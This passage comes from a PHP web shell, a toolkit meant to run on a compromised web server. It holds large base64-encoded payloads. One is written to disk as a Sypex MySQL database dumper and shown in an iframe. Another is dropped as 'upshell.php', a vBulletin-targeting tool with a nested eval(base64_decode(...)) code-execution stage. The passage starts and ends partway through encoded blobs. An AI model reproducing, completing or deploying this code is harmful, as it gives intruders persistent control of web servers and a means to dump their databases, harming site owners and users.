VYVD0jMDAwMDAwPgo8VEFCTEUgV0lEVEg9MTAwJSBIRUlHSFQ9MTAwJSBCT1JERVI9MCBDRUxMU1BBQ0lORz0wIENFTExQQURESU5HPTAgQUxJR049Q0VOVEVSPgo8VFI+CjxURCBIRUlHSFQ9NjAlIEFMSUdOPUNFTlRFUiBWQUxJR049TUlERExFPgo8VEFCTEUgV0lEVEg9MzYwIEJPUkRFUj0wIENFTExTUEFDSU5HPTAgQ0VMTFBBRERJTkc9MD4KPFRSPgo8VEQgVkFMSUdOPVRPUCBTVFlMRT0iYm9yZGVyOiAxcHggc29saWQgIzkxOUI5QzsiPgo8VEFCTEUgV0lEVEg9MTAwJSBIRUlHSFQ9MTAwJSBCT1JERVI9MCBDRUxMU1BBQ0lORz0xIENFTExQQURESU5HPTA+CjxUUj4KPFREIElEPUhlYWRlciBIRUlHSFQ9MjAgQkdDT0xPUj0jN0E5NkRGIFNUWUxFPSJmb250LXNpemU6IDEzcHg7IGNvbG9yOiB3aGl0ZTsgZm9udC1mYW1pbHk6IHZlcmRhbmEsIGFyaWFsOwpwYWRkaW5nLWxlZnQ6IDVweDsgRklMVEVSOiBwcm9naWQ6RFhJbWFnZVRyYW5zZm9ybS5NaWNyb3NvZnQuR3JhZGllbnQoZ3JhZGllbnRUeXBlPTEsc3RhcnRDb2xvclN0cj0jN0E5NkRGLGVuZENvbG9yU3RyPSNGQkZCRkQpIgpUSVRMRT0nJmNvcHk7IDIwMDMtMjAwNiB6YXBpbWlyJz4KPEI+PEEgSFJFRj1odHRwOi8vc3lwZXgubmV0L3Byb2R1Y3RzL2R1bXBlci8gU1RZTEU9ImNvbG9yOiB3aGl0ZTsgdGV4dC1kZWNvcmF0aW9uOiBub25lOyI+TXlzcWwgRHVtcGVyIDEuMC45PC9BPjwvQj48SU1HIElEPUdTIFdJRFRIPTEgSEVJR0hUPTEgU1RZTEU9InZpc2liaWxpdHk6IGhpZGRlbjsiPjwvVEQ+CjwvVFI+CjxUUj4KPEZPUk0gTkFNRT1za2IgTUVUSE9EPVBPU1QgQUNUSU9OPWR1bXBlci5waHA+CjxURCBWQUxJR049VE9QIEJHQ09MT1I9I0Y0RjNFRSBTVFlMRT0iRklMVEVSOiBwcm9naWQ6RFhJbWFnZVRyYW5zZm9ybS5NaWNyb3NvZnQuR3JhZGllbnQoZ3JhZGllbnRUeXBlPTAsc3RhcnRDb2xvclN0cj0jRkNGQkZFLGVuZENvbG9yU3RyPSNGNEYzRUUpOyBwYWRkaW5nOiA4cHggOHB4OyI+CnskY29udGVudH0KPFRBQkxFIFdJRFRIPTEwMCUgQk9SREVSPTAgQ0VMTFNQQUNJTkc9MCBDRUxMUEFERElORz0yPgo8VFI+CjxURCBTVFlMRT0nY29sb3I6ICNDRUNFQ0UnIElEPXRpbWVyPjwvVEQ+CjxURCBBTElHTj1SSUdIVD57JGJ1dHRvbnN9PC9URD4KPC9UUj4KPC9UQUJMRT48L1REPgo8L0ZPUk0+CjwvVFI+CjwvVEFCTEU+PC9URD4KPC9UUj4KPC9UQUJMRT48L1REPgo8L1RSPgo8L1RBQkxFPgo8L1REPgo8L1RSPgo8L1RBQkxFPgo8L0JPRFk+CjwvSFRNTD4KSFRNTDsKfQoKZnVuY3Rpb24gdHBsX21haW4oKXsKZ2xvYmFsICRTSzsKcmV0dXJuIDw8PEhUTUwKPEZJRUxEU0VUIG9uQ2xpY2s9ImRvY3VtZW50LnNrYi5hY3Rpb25bMF0uY2hlY2tlZCA9IDE7Ij4KPExFR0VORD4KPElOUFVUIFRZUEU9cmFkaW8gTkFNRT1hY3Rpb24gVkFMVUU9YmFja3VwPgpCYWNrdXAgLyDQodC+0LfQtNCw0L3QuNC1INGA0LXQt9C10YDQstC90L7QuSDQutC+0L/QuNC4INCR0JQmbmJzcDs8L0xFR0VORD4KPFRBQkxFIFdJRFRIPTEwMCUgQk9SREVSPTAgQ0VMTFNQQUNJTkc9MCBDRUxMUEFERElORz0yPgo8VFI+CjxURCBXSURUSD0zNSU+0JHQlDo8L1REPgo8VEQgV0lEVEg9NjUlPjxTRUxFQ1QgTkFNRT1kYl9iYWNrdXA+CnskU0stPnZhcnNbJ2RiX2JhY2t1cCddfQo8L1NFTEVDVD48L1REPgo8L1RSPgo8VFI+CjxURD7QpNC40LvRjNGC0YAg0YLQsNCx0LvQuNGGOjwvVEQ+CjxURD48SU5QVVQgTkFNRT10YWJsZXMgVFlQRT10ZXh0IENMQVNTPXRleHQgVkFMVUU9J3skU0stPnZhcnNbJ3RhYmxlcyddfSc+PC9URD4KPC9UUj4KPFRSPgo8VEQ+0JzQtdGC0L7QtCDRgdC20LDRgtC40Y86PC9URD4KPFREPjxTRUxFQ1QgTkFNRT1jb21wX21ldGhvZD4KeyRTSy0+dmFyc1snY29tcF9tZXRob2RzJ119CjwvU0VMRUNUPjwvVEQ+CjwvVFI+CjxUUj4KPFREPtCh0YLQtdC/0LXQvdGMINGB0LbQsNGC0LjRjzo8L1REPgo8VEQ+PFNFTEVDVCBOQU1FPWNvbXBfbGV2ZWw+CnskU0stPnZhcnNbJ2NvbXBfbGV2ZWxzJ119CjwvU0VMRUNUPjwvVEQ+CjwvVFI+CjwvVEFCTEU+CjwvRklFTERTRVQ+CjxGSUVMRFNFVCBvbkNsaWNrPSJkb2N1bWVudC5za2IuYWN0aW9uWzFdLmNoZWNrZWQgPSAxOyI+CjxMRUdFTkQ+CjxJTlBVVCBUWVBFPXJhZGlvIE5BTUU9YWN0aW9uIFZBTFVFPXJlc3RvcmU+ClJlc3RvcmUgLyDQktC+0YHRgdGC0LDQvdC+0LLQu9C10L3QuNC1INCR0JQg0LjQtyDRgNC10LfQtdGA0LLQvdC+0Lkg0LrQvtC/0LjQuCZuYnNwOzwvTEVHRU5EPgo8VEFCTEUgV0lEVEg9MTAwJSBCT1JERVI9MCBDRUxMU1BBQ0lORz0wIENFTExQQURESU5HPTI+CjxUUj4KPFREPtCR0JQ6PC9URD4KPFREPjxTRUxFQ1QgTkFNRT1kYl9yZXN0b3JlPgp7JFNLLT52YXJzWydkYl9yZXN0b3JlJ119CjwvU0VMRUNUPjwvVEQ+CjwvVFI+CjxUUj4KPFREIFdJRFRIPTM1JT7QpNCw0LnQuzo8L1REPgo8VEQgV0lEVEg9NjUlPjxTRUxFQ1QgTkFNRT1maWxlPgp7JFNLLT52YXJzWydmaWxlcyddfQo8L1NFTEVDVD48L1REPgo8L1RSPgo8L1RBQkxFPgo8L0ZJRUxEU0VUPgo8L1NQQU4+CjxTQ1JJUFQ+CmRvY3VtZW50LnNrYi5hY3Rpb25beyRTSy0+U0VUWydsYXN0X2FjdGlvbiddfV0uY2hlY2tlZCA9IDE7CjwvU0NSSVBUPgoKSFRNTDsKfQoKZnVuY3Rpb24gdHBsX3Byb2Nlc3MoJHRpdGxlKXsKcmV0dXJuIDw8PEhUTUwKPEZJRUxEU0VUPgo8TEVHRU5EPnskdGl0bGV9Jm5ic3A7PC9MRUdFTkQ+CjxUQUJMRSBXSURUSD0xMDAlIEJPUkRFUj0wIENFTExTUEFDSU5HPTAgQ0VMTFBBRERJTkc9Mj4KPFRSPjxURCBDT0xTUEFOPTI+PERJViBJRD1sb2dhcmVhIFNUWUxFPSJ3aWR0aDogMTAwJTsgaGVpZ2h0OiAxNDBweDsgYm9yZGVyOiAxcHggc29saWQgIzdGOURCOTsgcGFkZGluZzogM3B4OyBvdmVyZmxvdzogYXV0bzsiPjwvRElWPjwvVEQ+PC9UUj4KPFRSPjxURCBXSURUSD0zMSU+0KHRgtCw0YLRg9GBINGC0LDQsdC70LjRhtGLOjwvVEQ+PFREIFdJRFRIPTY5JT48VEFCTEUgV0lEVEg9MTAwJSBCT1JERVI9MSBDRUxMUEFERElORz0wIENFTExTUEFDSU5HPTA+CjxUUj48VEQgQkdDT0xPUj0jRkZGRkZGPjxUQUJMRSBXSURUSD0xIEJPUkRFUj0wIENFTExQQURESU5HPTAgQ0VMTFNQQUNJTkc9MCBCR0NPTE9SPSM1NTU1Q0MgSUQ9c3RfdGFiClNUWUxFPSJGSUxURVI6IHByb2dpZDpEWEltYWdlVHJhbnNmb3JtLk1pY3Jvc29mdC5HcmFkaWVudChncmFkaWVudFR5cGU9MCxzdGFydENvbG9yU3RyPSNDQ0NDRkYsZW5kQ29sb3JTdHI9IzU1NTVDQyk7CmJvcmRlci1yaWdodDogMXB4IHNvbGlkICNBQUFBQUEiPjxUUj48VEQgSEVJR0hUPTEyPjwvVEQ+PC9UUj48L1RBQkxFPjwvVEQ+PC9UUj48L1RBQkxFPjwvVEQ+PC9UUj4KPFRSPjxURD7QntCx0YnQuNC5INGB0YLQsNGC0YPRgTo8L1REPjxURD48VEFCTEUgV0lEVEg9MTAwJSBCT1JERVI9MSBDRUxMU1BBQ0lORz0wIENFTExQQURESU5HPTA+CjxUUj48VEQgQkdDT0xPUj0jRkZGRkZGPjxUQUJMRSBXSURUSD0xIEJPUkRFUj0wIENFTExQQURESU5HPTAgQ0VMTFNQQUNJTkc9MCBCR0NPTE9SPSMwMEFBMDAgSUQ9c29fdGFiClNUWUxFPSJGSUxURVI6IHByb2dpZDpEWEltYWdlVHJhbnNmb3JtLk1pY3Jvc29mdC5HcmFkaWVudChncmFkaWVudFR5cGU9MCxzdGFydENvbG9yU3RyPSNDQ0ZGQ0MsZW5kQ29sb3JTdHI9IzAwQUEwMCk7CmJvcmRlci1yaWdodDogMXB4IHNvbGlkICNBQUFBQUEiPjxUUj48VEQgSEVJR0hUPTEyPjwvVEQ+PC9UUj48L1RBQkxFPjwvVEQ+CjwvVFI+PC9UQUJMRT48L1REPjwvVFI+PC9UQUJMRT4KPC9GSUVMRFNFVD4KPFNDUklQVD4KdmFyIFdpZHRoTG9ja2VkID0gZmFsc2U7CmZ1bmN0aW9uIHMoc3QsIHNvKXsKICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc3RfdGFiJykud2lkdGggPSBzdCA/IHN0ICsgJyUnIDogJzEnOwogICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzb190YWInKS53aWR0aCA9IHNvID8gc28gKyAnJScgOiAnMSc7Cn0KZnVuY3Rpb24gbChzdHIsIGNvbG9yKXsKICAgICAgICBzd2l0Y2goY29sb3IpewogICAgICAgICAgICAgICAgY2FzZSAyOiBjb2xvciA9ICduYXZ5JzsgYnJlYWs7CiAgICAgICAgICAgICAgICBjYXNlIDM6IGNvbG9yID0gJ3JlZCc7IGJyZWFrOwogICAgICAgICAgICAgICAgY2FzZSA0OiBjb2xvciA9ICdtYXJvb24nOyBicmVhazsKICAgICAgICAgICAgICAgIGRlZmF1bHQ6IGNvbG9yID0gJ2JsYWNrJzsKICAgICAgICB9CiAgICAgICAgd2l0aChkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9nYXJlYScpKXsKICAgICAgICAgICAgICAgIGlmICghV2lkdGhMb2NrZWQpewogICAgICAgICAgICAgICAgICAgICAgICBzdHlsZS53aWR0aCA9IGNsaWVudFdpZHRoOwogICAgICAgICAgICAgICAgICAgICAgICBXaWR0aExvY2tlZCA9IHRydWU7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBzdHIgPSAnPEZPTlQgQ09MT1I9JyArIGNvbG9yICsgJz4nICsgc3RyICsgJzwvRk9OVD4nOwogICAgICAgICAgICAgICAgaW5uZXJIVE1MICs9IGlubmVySFRNTCA/ICI8QlI+XFxuIiArIHN0ciA6IHN0cjsKICAgICAgICAgICAgICAgIHNjcm9sbFRvcCArPSAxNDsKICAgICAgICB9Cn0KPC9TQ1JJUFQ+CkhUTUw7Cn0KCmZ1bmN0aW9uIHRwbF9hdXRoKCRlcnJvcil7CnJldHVybiA8PDxIVE1MCjxTUEFOIElEPWVycm9yPgo8RklFTERTRVQ+CjxMRUdFTkQ+0J7RiNC40LHQutCwPC9MRUdFTkQ+CjxUQUJMRSBXSURUSD0xMDAlIEJPUkRFUj0wIENFTExTUEFDSU5HPTAgQ0VMTFBBRERJTkc9Mj4KPFRSPgo8VEQ+0JTQu9GPINGA0LDQsdC+0YLRiyBTeXBleCBEdW1wZXIgTGl0ZSDRgtGA0LXQsdGD0LXRgtGB0Y86PEJSPiAtIEludGVybmV0IEV4cGxvcmVyIDUuNSssIE1vemlsbGEg0LvQuNCx0L4gT3BlcmEgOCsgKDxTUEFOIElEPXNpZT4tPC9TUEFOPik8QlI+IC0g0LLQutC70Y7Rh9C10L3QviDQstGL0L/QvtC70L3QtdC90LjQtSBKYXZhU2NyaXB0INGB0LrRgNC40L/RgtC+0LIgKDxTUEFOIElEPXNqcz4tPC9TUEFOPik8L1REPgo8L1RSPgo8L1RBQkxFPgo8L0ZJRUxEU0VUPgo8L1NQQU4+CjxTUEFOIElEPWJvZHkgU1RZTEU9ImRpc3BsYXk6IG5vbmU7Ij4KeyRlcnJvcn0KPEZJRUxEU0VUPgo8TEVHRU5EPkVudGVyIGxvZ2luIGFuZCBwYXNzd29yZDwvTEVHRU5EPgo8VEFCTEUgV0lEVEg9MTAwJSBCT1JERVI9MCBDRUxMU1BBQ0lORz0wIENFTExQQURESU5HPTI+CjxUUj4KPFREIFdJRFRIPTQxJT7Qm9C+0LPQuNC9OjwvVEQ+CjxURCBXSURUSD01OSU+PElOUFVUIE5BTUU9bG9naW4gVFlQRT10ZXh0IENMQVNTPXRleHQ+PC9URD4KPC9UUj4KPFRSPgo8VEQ+0J/QsNGA0L7Qu9GMOjwvVEQ+CjxURD48SU5QVVQgTkFNRT1wYXNzIFRZUEU9cGFzc3dvcmQgQ0xBU1M9dGV4dD48L1REPgo8L1RSPgo8L1RBQkxFPgo8L0ZJRUxEU0VUPgo8L1NQQU4+CjxTQ1JJUFQ+CmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzanMnKS5pbm5lckhUTUwgPSAnKyc7CmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdib2R5Jykuc3R5bGUuZGlzcGxheSA9ICcnOwpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZXJyb3InKS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOwp2YXIganNFbmFibGVkID0gdHJ1ZTsKPC9TQ1JJUFQ+CkhUTUw7Cn0KCmZ1bmN0aW9uIHRwbF9sKCRzdHIsICRjb2xvciA9IENfREVGQVVMVCl7CiRzdHIgPSBwcmVnX3JlcGxhY2UoIi9cc3syfS8iLCAiICZuYnNwOyIsICRzdHIpOwpyZXR1cm4gPDw8SFRNTAo8U0NSSVBUPmwoJ3skc3RyfScsICRjb2xvcik7PC9TQ1JJUFQ+CgpIVE1MOwp9CgpmdW5jdGlvbiB0cGxfZW5hYmxlQmFjaygpewpyZXR1cm4gPDw8SFRNTAo8U0NSSVBUPmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdiYWNrJykuZGlzYWJsZWQgPSAwOzwvU0NSSVBUPgoKSFRNTDsKfQoKZnVuY3Rpb24gdHBsX3MoJHN0LCAkc28pewokc3QgPSByb3VuZCgkc3QgKiAxMDApOwokc3QgPSAkc3QgPiAxMDAgPyAxMDAgOiAkc3Q7CiRzbyA9IHJvdW5kKCRzbyAqIDEwMCk7CiRzbyA9ICRzbyA+IDEwMCA/IDEwMCA6ICRzbzsKcmV0dXJuIDw8PEhUTUwKPFNDUklQVD5zKHskc3R9LHskc299KTs8L1NDUklQVD4KCkhUTUw7Cn0KCmZ1bmN0aW9uIHRwbF9iYWNrdXBfaW5kZXgoKXsKcmV0dXJuIDw8PEhUTUwKPENFTlRFUj4KPEgxPllvdSBkb24ndCBoYXZlIHBlcm1pc3Npb25zIHRvIGxpc3QgdGhpcyBkaXI8L0gxPgo8L0NFTlRFUj4KCkhUTUw7Cn0KCmZ1bmN0aW9uIHRwbF9lcnJvcigkZXJyb3IpewpyZXR1cm4gPDw8SFRNTAo8RklFTERTRVQ+CjxMRUdFTkQ+RXJyb3IgY29ubmVjdCB0byBEQjwvTEVHRU5EPgo8VEFCTEUgV0lEVEg9MTAwJSBCT1JERVI9MCBDRUxMU1BBQ0lORz0wIENFTExQQURESU5HPTI+CjxUUj4KPFREIEFMSUdOPWNlbnRlcj57JGVycm9yfTwvVEQ+CjwvVFI+CjwvVEFCTEU+CjwvRklFTERTRVQ+CgpIVE1MOwp9CgpmdW5jdGlvbiBTWERfZXJyb3JIYW5kbGVyKCRlcnJubywgJGVycm1zZywgJGZpbGVuYW1lLCAkbGluZW51bSwgJHZhcnMpIHsKICAgICAgICBpZiAoJGVycm5vID09IDIwNDgpIHJldHVybiB0cnVlOwogICAgICAgIGlmIChwcmVnX21hdGNoKCIvY2htb2RcKFwpLio/OiBPcGVyYXRpb24gbm90IHBlcm1pdHRlZC8iLCAkZXJybXNnKSkgcmV0dXJuIHRydWU7CiAgICAkZHQgPSBkYXRlKCJZLm0uZCBIOmk6cyIpOwogICAgJGVycm1zZyA9IGFkZHNsYXNoZXMoJGVycm1zZyk7CgogICAgICAgIGVjaG8gdHBsX2woInskZHR9PEJSPjxCPkVycm9yIHdhcyBvY2N1cmVkITwvQj4iLCBDX0VSUk9SKTsKICAgICAgICBlY2hvIHRwbF9sKCJ7JGVycm1zZ30gKHskZXJybm99KSIsIENfRVJST1IpOwogICAgICAgIGVjaG8gdHBsX2VuYWJsZUJhY2soKTsKICAgICAgICBkaWUoKTsKfQo/Pgo=
    ';
        $file       = fopen("dumper.php", "w+");
        $write      = fwrite($file, base64_decode($perltoolss));
        fclose($file);
        echo "<iframe src=dumper.php width=100% height=720px frameborder=0></iframe> ";
    } elseif ($action == 'upshell') {
        $file       = fopen($dir . "upshell.php", "w+");
        $perltoolss = 'PCFET0NUWVBFIEhUTUwgUFVCTElDICctLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTicgJ2h0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCc+CjxodG1sPgo8IS0tSXRzIEZpcnN0IFB1YmxpYyBWZXJzaW9uIAoKIC0tPgo8L2h0bWw+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0nQ29udGVudC1UeXBlJyBjb250ZW50PSd0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgnPgo8dGl0bGU+OjogVXBzaGVsbCA6OiBLeW1Mam5rIDo6PC90aXRsZT4KPHN0eWxlIHR5cGU9InRleHQvY3NzIj4KYSB7IAp0ZXh0LWRlY29yYXRpb246bm9uZTsKY29sb3I6d2hpdGU7CiB9Cjwvc3R5bGU+IAo8c3R5bGU+CmlucHV0IHsgCmNvbG9yOiMwMDAwMzU7IApmb250OjhwdCAndHJlYnVjaGV0IG1zJyxoZWx2ZXRpY2Esc2Fucy1zZXJpZjsKfQouRElSIHsgCmNvbG9yOiMwMDAwMzU7IApmb250OmJvbGQgOHB0ICd0cmVidWNoZXQgbXMnLGhlbHZldGljYSxzYW5zLXNlcmlmO2NvbG9yOiNGRkZGRkY7CmJhY2tncm91bmQtY29sb3I6I0FBMDAwMDsKYm9yZGVyLXN0eWxlOm5vbmU7Cn0KLnR4dCB7IApjb2xvcjojMkEwMDAwOyAKZm9udDpib2xkICA4cHQgJ3RyZWJ1Y2hldCBtcycsaGVsdmV0aWNhLHNhbnMtc2VyaWY7Cn0gCmJvZHksIHRhYmxlLCBzZWxlY3QsIG9wdGlvbiwgLmluZm8Kewpmb250OmJvbGQgIDhwdCAndHJlYnVjaGV0IG1zJyxoZWx2ZXRpY2Esc2Fucy1zZXJpZjsKfQpib2R5IHsKCWJhY2tncm91bmQtY29sb3I6ICNFNUU1RTU7Cn0KLnN0eWxlMSB7Y29sb3I6ICNBQTAwMDB9Ci50ZAp7CmJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7CmJvcmRlci10b3A6IDBweDsKYm9yZGVyLWxlZnQ6IDBweDsKYm9yZGVyLXJpZ2h0OiAwcHg7Cn0KLnRkVVAKewpib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2Owpib3JkZXItdG9wOiAxcHg7CmJvcmRlci1sZWZ0OiAwcHg7CmJvcmRlci1yaWdodDogMHB4Owpib3JkZXItYm90dG9tOiAxcHg7Cn0KLnN0eWxlNCB7Y29sb3I6ICNGRkZGRkY7IH0KPC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KPD9waHAKZWNobyAiPENFTlRFUj4KICA8dGFibGUgYm9yZGVyPScxJyBjZWxscGFkZGluZz0nMCcgY2VsbHNwYWNpbmc9JzAnIHN0eWxlPSdib3JkZXItY29sbGFwc2U6IGNvbGxhcHNlOyBib3JkZXItc3R5bGU6IHNvbGlkOyBib3JkZXItY29sb3I6ICNDMEMwQzA7IHBhZGRpbmctbGVmdDogNDsgcGFkZGluZy1yaWdodDogNDsgcGFkZGluZy10b3A6IDE7IHBhZGRpbmctYm90dG9tOiAxJyBib3JkZXJjb2xvcj0nIzExMTExMScgd2lkdGg9Jzg2JScgYmdjb2xvcj0nI0UwRTBFMCc+CiAgICA8dHI+CiAgICAgIDx0ZCBiZ2NvbG9yPScjMDAwMGZmJyBjbGFzcz0ndGQnPjxkaXYgYWxpZ249J2NlbnRlcicgY2xhc3M9J3N0eWxlNCc+IEhheSBjaG9uIG1hIG5ndW9uPC9kaXY+PC90ZD4KICAgICAgPHRkIGJnY29sb3I9JyMwMDAwZmYnIGNsYXNzPSd0ZCcgc3R5bGU9J3BhZGRpbmc6MHB4IDBweCAwcHggNXB4Jz48ZGl2IGFsaWduPSdjZW50ZXInIGNsYXNzPSdzdHlsZTQnPgogICAgICAgIDxkaXYgYWxpZ249J2xlZnQnPgogICAgICAgIDwvZGl2PgogICAgICA8L2Rpdj48L3RkPgogICAgPC90cj4KICAgIDx0cj4KICAgIDx0ZCB3aWR0aD0nMTAwJScgaGVpZ2h0PScyODAnIHN0eWxlPSdwYWRkaW5nOjIwcHggMjBweCAyMHB4IDIwcHggJz4iOwoKaWYgKGlzc2V0KCRfUE9TVFsndmJiJ10pKQp7CiAgICBta2RpcigndXBzaGVsbCcsIDA3NTUpOwogICAgY2hkaXIoJ3Vwc2hlbGwnKTsKJGNvbmZpZ3NoZWxsID0gJ1BHaDBiV3crQ2p4MGFYUnNaVDUyUW5Wc2JHVjBhVzRnUzJsc2JHVnlQQzkwYVhSc1pUNEtQR05sYm5SbGNqNEtQR1p2Y20wZ2JXVjBhRzlrUFZCUFUxUWdZV04wYVc5dVBTY25QZ284Wm05dWRDQm1ZV05sUFNkQmNtbGhiQ2NnWTI5c2IzSTlKeU13TURBd01EQW5QazE1YzNGc0lFaHZjM1E4TDJadmJuUStQR0p5UGp4cGJuQjFkQ0IyWVd4MVpUMXNiMk5oYkdodmMzUWdkSGx3WlQxMFpYaDBJRzVoYldVOWFHOXpkRzVoYldVZ2MybDZaVDBuTlRBbklITjBlV3hsUFNkbWIyNTBMWE5wZW1VNklEaHdkRHNnWTI5c2IzSTZJQ013TURBd01EQTdJR1p2Ym5RdFptRnRhV3g1T2lCVVlXaHZiV0U3SUdKdmNtUmxjam9nTVhCNElITnZiR2xrSUNNMk5qWTJOalk3SUdKaFkydG5jbTkxYm1RdFkyOXNiM0k2SUNOR1JrWkdSa1luUGp4aWNqNEtQR1p2Ym5RZ1ptRmpaVDBuUVhKcFlXd25JR052Ykc5eVBTY2pNREF3TURBd0p6NUVRaUJ1WVcxbFBHSnlQand2Wm05dWRENDhhVzV3ZFhRZ2RtRnNkV1U5WkdGMFlXSmhjMlVnZEhsd1pUMTBaWGgwSUc1aGJXVTlaR0p1WVcxbElITnBlbVU5SnpVd0p5QnpkSGxzWlQwblptOXVkQzF6YVhwbE9pQTRjSFE3SUdOdmJHOXlPaUFqTURBd01EQXdPeUJtYjI1MExXWmhiV2xzZVRvZ1ZHRm9iMjFoT3lCaWIzSmtaWEk2SURGd2VDQnpiMnhwWkNBak5qWTJOalkyT3lCaVlXTnJaM0p2ZFc1a0xXTnZiRzl5T2lBalJrWkdSa1pHSno0OFluSStDanhtYjI1MElHWmhZMlU5SjBGeWFXRnNKeUJqYjJ4dmNqMG5JekF3TURBd01DYytSRUlnZFhObGNqeGljajQ4TDJadmJuUStQR2x1Y0hWMElIWmhiSFZsUFhWelpYSWdkSGx3WlQxMFpYaDBJRzVoYldVOVpHSjFjMlZ5SUhOcGVtVTlKelV3SnlCemRIbHNaVDBuWm05dWRDMXphWHBsT2lBNGNIUTdJR052Ykc5eU9pQWpNREF3TURBd095Qm1iMjUwTFdaaGJXbHNlVG9nVkdGb2IyMWhPeUJpYjNKa1pYSTZJREZ3ZUNCemIyeHBaQ0FqTmpZMk5qWTJPeUJpWVdOclozSnZkVzVrTFdOdmJHOXlPaUFqUmtaR1JrWkdKejQ4WW5JK0NqeG1iMjUwSUdaaFkyVTlKMEZ5YVdGc0p5QmpiMnh2Y2owbkl6QXdNREF3TUNjK1JFSWdaR0p3WVhOelBHSnlQand2Wm05dWRENDhhVzV3ZFhRZ2RtRnNkV1U5Y0dGemN5QjBlWEJsUFhSbGVIUWdibUZ0WlQxa1luQmhjM01nYzJsNlpUMG5OVEFuSUhOMGVXeGxQU2RtYjI1MExYTnBlbVU2SURod2REc2dZMjlzYjNJNklDTXdNREF3TURBN0lHWnZiblF0Wm1GdGFXeDVPaUJVWVdodmJXRTdJR0p2Y21SbGNqb2dNWEI0SUhOdmJHbGtJQ00yTmpZMk5qWTdJR0poWTJ0bmNtOTFibVF0WTI5c2IzSTZJQ05HUmtaR1JrWW5QanhpY2o0S1BHWnZiblFnWm1GalpUMG5RWEpwWVd3bklHTnZiRzl5UFNjak1EQXdNREF3Sno1VVlXSnNaU0J3Y21WbWFYZzhZbkkrUEM5bWIyNTBQanhwYm5CMWRDQjJZV3gxWlQwbmRtSmlYeWNnZEhsd1pUMTBaWGgwSUc1aGJXVTljSEpsWm1sNElITnBlbVU5SnpVd0p5QnpkSGxzWlQwblptOXVkQzF6YVhwbE9pQTRjSFE3SUdOdmJHOXlPaUFqTURBd01EQXdPeUJtYjI1MExXWmhiV2xzZVRvZ1ZHRm9iMjFoT3lCaWIzSmtaWEk2SURGd2VDQnpiMnhwWkNBak5qWTJOalkyT3lCaVlXTnJaM0p2ZFc1a0xXTnZiRzl5T2lBalJrWkdSa1pHSno0OFluSStDanhtYjI1MElHWmhZMlU5SjBGeWFXRnNKeUJqYjJ4dmNqMG5JekF3TURBd01DYytWWE5sY2lCaFpHMXBianhpY2o0OEwyWnZiblErUEdsdWNIVjBJSFpoYkhWbFBYSnZiM1FnZEhsd1pUMTBaWGgwSUc1aGJXVTlkWE5sY2lCemFYcGxQU2MxTUNjZ2MzUjViR1U5SjJadmJuUXRjMmw2WlRvZ09IQjBPeUJqYjJ4dmNqb2dJekF3TURBd01Ec2dabTl1ZEMxbVlXMXBiSGs2SUZSaGFHOXRZVHNnWW05eVpHVnlPaUF4Y0hnZ2MyOXNhV1FnSXpZMk5qWTJOanNnWW1GamEyZHliM1Z1WkMxamIyeHZjam9nSTBaR1JrWkdSaWMrUEdKeVBnbzhabTl1ZENCbVlXTmxQU2RCY21saGJDY2dZMjlzYjNJOUp5TXdNREF3TURBblBrNWxkeUJ3WVhOeklHRmtiV2x1UEdKeVBqd3ZabTl1ZEQ0OGFXNXdkWFFnZG1Gc2RXVTlNVEl6TkRVMklIUjVjR1U5ZEdWNGRDQnVZVzFsUFhCaGMzTWdjMmw2WlQwbk5UQW5JSE4wZVd4bFBTZG1iMjUwTFhOcGVtVTZJRGh3ZERzZ1kyOXNiM0k2SUNNd01EQXdNREE3SUdadmJuUXRabUZ0YVd4NU9pQlVZV2h2YldFN0lHSnZjbVJsY2pvZ01YQjRJSE52Ykdsa0lDTTJOalkyTmpZN0lHSmhZMnRuY205MWJtUXRZMjlzYjNJNklDTkdSa1pHUmtZblBqeGljajRLUEdadmJuUWdabUZqWlQwblFYSnBZV3duSUdOdmJHOXlQU2NqTURBd01EQXdKejVPWlhjZ1JTMXRZV2xzSUdGa2JXbHVQR0p5UGp3dlptOXVkRDQ4YVc1d2RYUWdkbUZzZFdVOWEzbHRiR3B1YTBCNVlXaHZieTVqYjIwZ2RIbHdaVDEwWlhoMElHNWhiV1U5WlcxaGFXd2djMmw2WlQwbk5UQW5JSE4wZVd4bFBTZG1iMjUwTFhOcGVtVTZJRGh3ZERzZ1kyOXNiM0k2SUNNd01EQXdNREE3SUdadmJuUXRabUZ0YVd4NU9pQlVZV2h2YldFN0lHSnZjbVJsY2pvZ01YQjRJSE52Ykdsa0lDTTJOalkyTmpZN0lHSmhZMnRuY205MWJtUXRZMjlzYjNJNklDTkdSa1pHUmtZblBqeGljajRLUEdadmJuUWdabUZqWlQwblFYSnBZV3duSUdOdmJHOXlQU2NqTURBd01EQXdKejVEYjJSbElGTm9aV3hzUEdKeVBqd3ZabTl1ZEQ0OGRHVjRkR0Z5WldFZ2JtRnRaVDBpWkdGMFlTSWdZMjlzY3owaU5EQWlJSEp2ZDNNOUlqRXdJajRrYzNCaFkyVnlYMjl3Wlc0S2V5UjdaWFpoYkNoaVlYTmxOalJmWkdWamIyUmxLQ0poVjFsdllWaE9lbHBZVVc5S1JqbFJWREZPVlZkNVpGUmtWMG9nZEdGWVVXNVlVMnR3Wlhjd1MwbERRV2RKUTFKdFlWZDRiRnBIYkhsSlJEQm5TV2xKTjBsQk1FdEpRMEZuU1VOU2RGa2dXR2h0WVZkNGJFbEVNR2RLZWtsM1RVUkJkMDFFUVc1UGR6QkxSRkZ2WjBsRFFXZEtTRlo2V2xoS2JXRlhlR3hZTWpVZ2FHSlhWV2RRVTBGcldEQmFTbFJGVmxSWGVXUndZbGRHYmxwVFpHUlhlV1IxV1ZjeGJFb3hNRGRFVVc5blNVTk